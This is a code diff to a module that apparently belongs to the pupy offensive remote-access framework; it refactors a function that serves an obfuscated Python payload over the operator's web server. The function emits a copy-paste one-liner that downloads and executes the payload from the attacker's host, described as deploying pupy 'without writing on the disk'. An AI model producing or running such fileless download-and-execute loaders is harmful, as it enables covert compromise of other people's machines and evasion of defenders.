@@ -62,21 +62,24 @@ def pack_py_payload(display, conf, debug=False):
     return compress_encode_obfs(payload, main=True)
 
 
-def serve_payload(display, server, payload, link_ip="<your_ip>"):
+def serve_payload(display, server, payload, link_ip=None):
     if not server:
         display(Error('Oneliners only supported from pupysh'))
         return
 
-    if not server.pupweb:
+    if not server.web_handler_enabled:
         display(Error('Webserver disabled'))
         return
 
-    landing_uri = server.pupweb.serve_content(payload, alias='py payload')
+    landing_uri = server.serve_content(payload, alias='py payload')
 
     display(Warn('Python 2.7.x required, x should be >= 9'))
 
+    if link_ip is None:
+        link_ip = server.address
+
     display(List([
         "python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s%s\").read()'"%(
-            link_ip, server.pupweb.port, landing_uri),
+            link_ip, server.web_handler_port, landing_uri),
     ], caption=Success(
         'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
